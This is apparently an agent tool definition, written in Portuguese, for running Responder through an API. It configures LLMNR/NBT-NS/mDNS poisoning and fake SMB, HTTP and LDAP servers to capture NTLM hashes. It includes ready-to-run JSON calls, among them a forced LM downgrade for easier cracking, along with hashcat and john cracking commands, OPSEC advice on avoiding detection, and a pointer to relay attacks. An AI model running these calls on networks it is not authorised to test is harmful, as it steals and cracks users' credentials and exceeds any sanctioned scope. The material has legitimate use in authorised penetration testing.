---
name: "responder"
description: "Ferramenta de envenenamento LLMNR/NBT-NS/mDNS para captura de hashes NTLMv1/v2 em redes Windows. Inclui servidores falsos SMB, HTTP, LDAP, FTP, MSSQL para interceptação de autenticação."
---

# responder

## Objetivo

- Envenenar LLMNR, NBT-NS e mDNS para capturar hashes NTLM
- Servidores falsos: SMB, HTTP, LDAP, FTP, MSSQL, SMTP, POP3, DNS
- Capturar NTLMv1/v2 hashes para crack offline com hashcat/john
- Executar ataques de relay (com ntlmrelayx)
- Identificar hosts Windows que fazem broadcast de nomes

## Endpoint

- /api/tools/run (tool: "responder")

## Requer target

- não (opera em modo passivo na rede)

## Parâmetros

| Parâmetro | Tipo   | Obrigatório | Descrição                                 |
|-----------|--------|-------------|-------------------------------------------|
| target    | string | não         | Não utilizado (responder opera na rede)   |
| options   | string | sim         | Flags do CLI (obrigatório -I interface)   |

## Flags Importantes

| Flag              | Efeito                                                    |
|-------------------|-----------------------------------------------------------|
| `-I <iface>`      | Interface de rede (ex: eth0, wlan0) — OBRIGATÓRIO         |
| `-A`              | Modo análise (sem envenenamento, só captura passiva)      |
| `-w`              | Ativar servidor WPAD                                      |
| `-b`              | Ativar Basic HTTP auth (captura credenciais em claro)     |
| `-r`              | Ativar respostas NBT-NS para workstations                 |
| `-d`              | Ativar respostas NBT-NS para servidores de domínio        |
| `-f`              | Fingerprint do SO dos clientes                            |
| `-v`              | Modo verboso                                              |
| `--lm`            | Forçar downgrade para LM hashes (mais fáceis de quebrar)  |
| `--disable-ess`   | Desativar ESS (Extended Session Security)                 |
| `-P`              | Forçar autenticação NTLM via Proxy                        |

## Exemplos

### Captura básica de hashes
```json
{
  "tool": "responder",
  "target": "",
  "options": "-I eth0 -rdwv"
}
```

### Modo análise (passivo, sem envenenamento)
```json
{
  "tool": "responder",
  "target": "",
  "options": "-I eth0 -A"
}
```

### Com servidor WPAD
```json
{
  "tool": "responder",
  "target": "",
  "options": "-I eth0 -wrdv"
}
```

### Forçar LM para crack mais fácil
```json
{
  "tool": "responder",
  "target": "",
  "options": "-I eth0 --lm -rdwv"
}
```

## Localização dos Hashes Capturados

Hashes são salvos automaticamente em:
```
/usr/share/responder/logs/
  ├── SMB-NTLMv2-SSP-<IP>.txt
  ├── HTTP-NTLMv2-<IP>.txt
  └── Analyzer-Session.log
```

## Crack dos Hashes Capturados

```bash
# Com hashcat
hashcat -m 5600 hashes.txt /root/wordlists/rockyou.txt

# Com john
john hashes.txt --format=netntlmv2 --wordlist=/root/wordlists/rockyou.txt
```

## OPSEC

- LLMNR poisoning é detectado por ferramentas como BloodHound e Microsoft Defender
- Use `-A` (análise) primeiro para mapear o ambiente sem envenenar
- Em ambientes com logs centralizados, capturas geram alertas imediatos
- WPAD (`-w`) pode causar interrupções de serviço — use com cautela
- Combine com ntlmrelayx para ataques de relay sem precisar quebrar hashes

## Saída

- JSON com campos: `success`, `stdout`, `stderr`, `report`, `artifacts`
- Hashes capturados aparecem em stdout e são salvos em /usr/share/responder/logs/
